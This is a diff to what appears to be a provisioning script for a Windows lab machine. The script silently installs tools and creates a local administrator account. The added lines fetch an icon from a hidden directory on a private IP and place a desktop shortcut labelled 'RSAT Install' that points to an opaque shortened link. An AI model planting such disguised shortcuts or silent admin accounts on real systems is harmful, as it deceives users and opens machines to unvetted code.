@@ -181,6 +181,13 @@ resources:
             & c:\npp.exe /S
             (new-object System.Net.WebClient).DownloadFile('https://the.earth.li/~sgtatham/putty/latest/x86/putty-0.67-installer.msi','C:\putty.msi')
             & msiexec /i c:\putty.msi /quiet /passive
+            (new-object System.Net.WebClient).DownloadFile('10.50.22.211/windows/.hidden/Disorderly_Domain/rsat.ico','C:\windows\system32\rsat.ico')
+            # generates RSAT desktop shortcut
+            $WshShell = New-Object -ComObject WScript.Shell
+            $Shortcut = $WshShell.CreateShortcut("$Home\Desktop\RSAT Install.lnk")
+            $Shortcut.TargetPath = "goo.gl/J4OguI"
+            $Shortcut.IconLocation = "C:\windows\system32\rsat.ico"
+            $Shortcut.Save()
             net user /add $user $password /y
             net localgroup administrators /add $user
             exit 1001
